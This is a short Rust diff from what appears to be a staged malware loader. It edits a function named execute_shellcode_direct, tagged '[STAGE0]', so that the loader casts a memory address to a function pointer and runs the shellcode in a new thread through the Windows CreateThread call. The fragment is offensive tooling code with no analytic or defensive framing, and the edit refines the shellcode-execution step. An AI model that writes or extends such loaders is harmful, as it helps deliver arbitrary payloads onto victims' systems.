@@ -200,10 +200,14 @@ fn execute_shellcode_direct(shellcode: &[u8]) -> Result<(), Box<dyn std::error::
         #[cfg(feature = "dev")]
         println!("[STAGE0] Creating thread to execute shellcode");
         
+        // Cast address to function pointer safely through usize
+        let shellcode_fn: unsafe extern "system" fn(*mut c_void) -> u32 = 
+            unsafe { std::mem::transmute(addr as usize) };
+        
         let thread = CreateThread(
             std::ptr::null_mut(),
             0,
-            Some(std::mem::transmute(addr)),
+            Some(shellcode_fn),
             std::ptr::null_mut(),
             0,
             std::ptr::null_mut(),
